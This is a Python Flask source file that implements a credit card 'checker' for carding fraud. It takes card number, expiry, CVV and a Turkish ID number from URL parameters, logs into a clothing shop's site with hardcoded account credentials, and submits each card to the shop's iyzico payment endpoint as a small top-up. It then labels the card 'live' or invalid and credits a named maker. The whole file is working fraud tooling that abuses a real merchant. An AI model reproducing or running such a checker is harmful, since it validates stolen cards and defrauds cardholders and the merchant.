from flask import Flask, request
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)

USER = "kolsuzpabg@gmail.com"
PASS = "babapro31"

session = requests.Session()

login_get_url = "https://cmrerkekgiyim.com/uyegirisi"
headers_get = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Accept": "*/*"
}

login_post_url = "https://cmrerkekgiyim.com/uyeislem.php?islem=girisyap"
login_headers = {
    "User-Agent": headers_get["User-Agent"],
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://cmrerkekgiyim.com",
    "Referer": login_get_url
}

@app.route("/iyzico")
def iyzico():
    cc = request.args.get("cc")
    ay = request.args.get("ay")
    yil = request.args.get("yil")
    cvv = request.args.get("cvv")
    identity = request.args.get("identityNumber", "")  # URL’den al

    # Login sayfasını aç
    res_get = session.get(login_get_url, headers=headers_get, verify=False)
    php_sess = session.cookies.get("PHPSESSID", "")

    # Login yap
    login_data = {"eposta": USER, "sifre": PASS}
    login_headers["Cookie"] = f"PHPSESSID={php_sess}"
    res_post = session.post(login_post_url, headers=login_headers, data=login_data, verify=False)

    if "Giriş Başarılı" not in res_post.text:
        return "Login Failed", 403

    # Profil bilgilerini çek
    profil_url = "https://cmrerkekgiyim.com/profilim"
    profil_headers = {"User-Agent": headers_get["User-Agent"], "Cookie": f"PHPSESSID={php_sess}"}
    res_profil = session.get(profil_url, headers=profil_headers, verify=False)
    soup = BeautifulSoup(res_profil.text, "html.parser")

    isim = soup.find("input", {"id": "profile-first-name"}).get("value", "")

    # İyzico post
    iyzico_url = "https://cmrerkekgiyim.com/iyzicoparapuan.php"
    iyzico_data = {
        "toplamtutar": "5",
        "aciklama": "Kredi Kartı ile Parapuan Yükleme",
        "CardHolderName": isim,
        "CardNumber": cc,
        "Expire": f"{ay}/{yil}",
        "x_card_code": cvv,
        "identityNumber": identity,  # URL’den alınan TC
        "taksit": "1"
    }
    iyz_res = session.post(iyzico_url, headers={"User-Agent": headers_get["User-Agent"]}, data=iyzico_data, verify=False)

    yapimci = "💎Yapimci:@ozeneceksiniz✅"

    if "3-D Secure" in iyz_res.text:
        return f"{cc} {ay} {cvv} -> Kart gecerli live🥳 | {yapimci}"
    else:
        soup2 = BeautifulSoup(iyz_res.text, "html.parser")
        yanit_cc = soup2.find("div", {"class": "alert alert-danger"})
        if yanit_cc:
            return f"{cc} -> Yanıt: {yanit_cc.get_text(strip=True)} | {yapimci}"
        return f"{cc} {ay} {cvv} -> Gecersiz Kart💔 | {yapimci}"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
